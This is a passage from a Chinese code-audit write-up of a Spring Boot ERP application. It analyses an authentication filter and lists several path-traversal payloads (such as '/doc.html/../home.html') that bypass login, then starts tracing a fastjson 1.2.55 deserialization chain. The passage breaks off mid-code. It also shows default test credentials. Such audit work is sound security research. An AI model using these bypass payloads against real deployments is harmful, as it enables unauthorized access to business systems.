层接口  </li><li>datasource      数据源和数据库访问配置  </li><li>exception    异常处理  </li><li>filter<ul><li>LogCostFilter   自定义 Servlet 过滤器， 控制用户访问权限和登录请求处理</li></ul></li><li>service     业务逻辑层  </li><li>utils    工具类  </li><li>ErpApplication.java    入口类，参考<a href="https://www.yuque.com/taohuayuanpang/kfw7zl/cqdlt0kgwyh524ay#vrt3I">SpringBoot-注解 @SpringBootApplication 分析</a></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//声明 springboot，组合了@SpringBootConfiguration @EnableAutoConfiguration @ComponentScann</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-comment">//MyBatis Mapper 接口扫描路径</span><br><span class="hljs-meta">@MapperScan(&quot;com.jsh.erp.datasource.mappers&quot;)</span><br><span class="hljs-meta">@ServletComponentScan</span><br><span class="hljs-meta">@EnableScheduling</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErpApplication</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SpringApplication.run(ErpApplication.class, args);<br>        <span class="hljs-type">Environment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> context.getBean(Environment.class);<br>        System.out.println(<span class="hljs-string">&quot;启动成功，访问地址：http://&quot;</span> + ComputerInfo.getIpAddr() + <span class="hljs-string">&quot;:&quot;</span><br>                           + environment.getProperty(<span class="hljs-string">&quot;server.port&quot;</span>) + <span class="hljs-string">&quot;，测试用户：jsh，密码：123456&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="1、LogCostFilter-java"><a href="#1、LogCostFilter-java" class="headerlink" title="1、LogCostFilter.java"></a>1、LogCostFilter.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsh.erp.filter;<br><br><span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebInitParam;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-meta">@WebFilter(</span><br><span class="hljs-meta">    filterName = &quot;LogCostFilter&quot;,</span><br><span class="hljs-meta">    //过滤器对所有路径都生效</span><br><span class="hljs-meta">    urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">    initParams = &#123;</span><br><span class="hljs-meta">        //要忽略的静态资源</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">        //允许未登录访问的路径</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;filterPath&quot;, value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)</span><br><span class="hljs-meta">    &#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogCostFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filterPath&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IGNORED_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ignoredUrl&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; ignoredList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> String[] allowUrls;<br>    <span class="hljs-keyword">private</span> String[] ignoredUrls;<br><br>    <span class="hljs-comment">//将 filterPath 和 ignoredUrl 解析成 allowUrls 和 ignoredList（白名单），用于后续 doFilter 判断</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(FILTER_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;<br>            allowUrls = filterPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? filterPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;filterPath&#125;;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ignoredPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(IGNORED_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(ignoredPath)) &#123;<br>            ignoredUrls = ignoredPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? ignoredPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;ignoredPath&#125;;<br>            <span class="hljs-keyword">for</span> (String ignoredUrl : ignoredUrls) &#123;<br>                ignoredList.add(ignoredUrl);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,</span><br><span class="hljs-params">                         FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>        <span class="hljs-comment">//具体，比如：处理若用户未登录，则跳转到登录页</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-keyword">if</span>(userInfo!=<span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//如果已登录，不阻止</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//未登录时允许访问的页面</span><br>        <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>                                   requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// ignoredList</span><br>        <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>            chain.doFilter(servletRequest, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// allowUrls</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>                <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                    chain.doFilter(request, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//if 条件都不满足，重定向到 /login.html</span><br>        servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^.*&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexSuffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.*$&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(List&lt;String&gt; ignoredList, String url)</span> &#123;<br>        <span class="hljs-keyword">for</span> (String regex : ignoredList) &#123;<br>            <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(url);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤逻辑：</p><ul><li>放行：<ul><li>Session 中有 user</li><li>访问 <code>/doc.html</code> <code>/register.html</code> <code>/login.html</code>   </li><li>ignoredList  静态资源</li><li>allowUrls     &#x2F;user&#x2F;login   &#x2F;user&#x2F;registerUser    &#x2F;v2&#x2F;api-docs</li></ul></li><li>其他全部重定向到 &#x2F;login.html</li><li>缺陷：<ul><li>虽然有白名单，但路径匹配不完整，如果在 url 中构建如：1.css&#x2F;..&#x2F;index.html  doc.html&#x2F;..&#x2F;index.html 等，就会绕过</li></ul></li></ul><p><strong>漏洞利用：</strong></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">/doc.html/../home.html<br>/register.html/../home.html<br>/login.html/../home.html<br>/1.css/../home.html<br>/user/login/../../home.html<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349294.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349044.png"></p><p><strong>注意：</strong></p><p>这抓包中有时会抓到这样一行数据： If-Modified-Since: Tue, 05 Jan 2021 22:51:28 GMT  </p><p>这是浏览器的本地缓存，如果这个资源自这个时间点之后没有修改，就返回304</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349541.png"></p><p>把这个去掉就可以正常注入了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349763.png"></p><h2 id="2、pom-xml-Maven-依赖"><a href="#2、pom-xml-Maven-依赖" class="headerlink" title="2、pom.xml - Maven 依赖"></a>2、pom.xml - <strong>Maven 依赖</strong></h2><h3 id="2-1-fastjson-1-2-55-反序列化漏洞"><a href="#2-1-fastjson-1-2-55-反序列化漏洞" class="headerlink" title="2.1 fastjson-1.2.55-反序列化漏洞"></a>2.1 fastjson-1.2.55-反序列化漏洞</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349971.png"></p><p>入口点：parseObject</p><p>**全局搜索 parseObject **，找一个带有可控变量的点</p><p>找到 src&#x2F;main&#x2F;java&#x2F;com&#x2F;jsh&#x2F;erp&#x2F;utils&#x2F;StringUtil.java 中有利用点</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349969.png"></p><h4 id="分析链："><a href="#分析链：" class="headerlink" title="分析链："></a>分析链：</h4><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>    <span class="hljs-comment">//返回值初始化为空字符串</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//判断 search 是否为空</span><br>    <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">//将 search 解析为 JSONObject</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>        <span class="hljs-comment">//从 JSONObject 取一个 key 并转化为 String</span><br>        value = obj.getString(key);<br>        <span class="hljs-comment">//如果取到空字符串，value = null;</span><br>        <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            value = <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 <font style="color:#080808;background-color:#ffffff;">JSONObject.parseObject</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String text)</span> &#123;<br><span class="hljs-comment">//调用了 parse 方法，把 text 解析成一个 Java 对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br><span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>    <span class="hljs-keyword">return</span> (JSONObject) obj;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 <font style="color:#080808;background-color:#ffffff;">parse(String text)</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-comment">//调用了另一个 parse</span><br>    <span class="hljs-keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 <font style="color:#080808;background-color:#ffffff;">parse(String text, int features)</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, <span class="hljs-type">int</span> features)</span> &#123;<br>    <span class="hljs-comment">//引入了 ParserConfig.getGlobalInstance() 方法</span><br>    <span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 parse(String text, ParserConfig config, int features)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, ParserConfig config, <span class="hljs-type">int</span> features)</span> &#123;<br>        <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br>        <span class="hljs-comment">//解析 JSON</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>        parser.handleResovleTask(value);<br>        parser.close();<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进 <font style="color:#080808;background-color:#ffffff;">DefaultJSONParser</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String input, <span class="hljs-keyword">final</span> ParserConfig config, <span class="hljs-type">int</span> features)</span>&#123;<br>    <span class="hljs-comment">//创建 JSONScanner ，传给下一个核心构造器</span><br>    <span class="hljs-built_in">this</span>(input, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONScanner</span>(input, features), config);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object input, <span class="hljs-keyword">final</span> JSONLexer lexer, <span class="hljs-keyword">final</span> ParserConfig config)</span>&#123;<br>    <span class="hljs-comment">//lexer：词法分析器。</span><br>    <span class="hljs-built_in">this</span>.lexer = lexer;<br>    <span class="hljs-comment">//用户输入的 JSON 字符串</span><br>    <span class="hljs-built_in">this</span>.input = input;<br>    <span class="hljs-built_in">this</span>.config = config;<br>    <span class="hljs-built_in">this</span>.symbolTable = config.symbolTable;<br><br>    <span class="hljs-comment">//获取 JSON 输入的第一个字符，用于判断 JSON 的类型：&#123; 对象；[ 数组；其他（数字、字符串、布尔等）</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> lexer.getCurrent();<br>    <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACE;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        lexer.nextToken(); <span class="hljs-comment">// prime the pump</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><strong><font style="color:rgb(34, 34, 38);">lexer（词法分析器）与 parser（语法分析器）</font></strong></p><p><a href="https://blog.csdn.net/buguge/article/details/147525215"><strong>https://blog.csdn.net/buguge/article/details/147525215</strong></a></p><p><strong><font style="color:rgb(77, 77, 77);">词法分析器(Lexer)和语法分析器(Parser)</font></strong><font style="color:rgb(77, 77, 77);">是两个核心组件，它们协同工作将原始输入(如JSON字符串、代码文件)转换为结构化数据(如对象、抽象语法树)</font></p></blockquote><p>返回一步，Object value &#x3D; parser.parse();   跟进 parse()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(Object fieldName)</span> &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.lexer;<br><span class="hljs-keyword">switch</span> (lexer.token()) &#123;<br>    ...<br>    <span class="hljs-keyword">case</span> LBRACE:<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));<br>        <span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>    ...<br></code></pre></td></tr></table></figure><p>跟进 parseObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br></code></pre></td></tr></table></figure><p>在这个类中找我们需要的处理 @type 的部分，搜索  checkAutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JSON.DEFAULT_TYPE_KEY 即 @type</span><br><span class="hljs-keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">typeName</span> <span class="hljs-operator">=</span> lexer.scanSymbol(symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br><br>    Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br></code></pre></td></tr></table></figure><p>跟进 checkAutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br></code></pre></td></tr></table></figure><p>来到这个类中，按照之前版本的经验，下一步有个 <font style="color:rgb(51, 51, 51);">TypeUtils.loadClass ，继续搜索</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (autoTypeSupport || expectClassFlag) &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> h3;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; i &lt; className.length(); ++i) &#123;<br>        hash ^= className.charAt(i);<br>        hash *= PRIME;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 TypeUtils.loadClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) &#123;<br>    <span class="hljs-keyword">if</span>(className == <span class="hljs-literal">null</span> || className.length() == <span class="hljs-number">0</span> || className.length() &gt; <span class="hljs-number">128</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>下一步执行序列化和反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 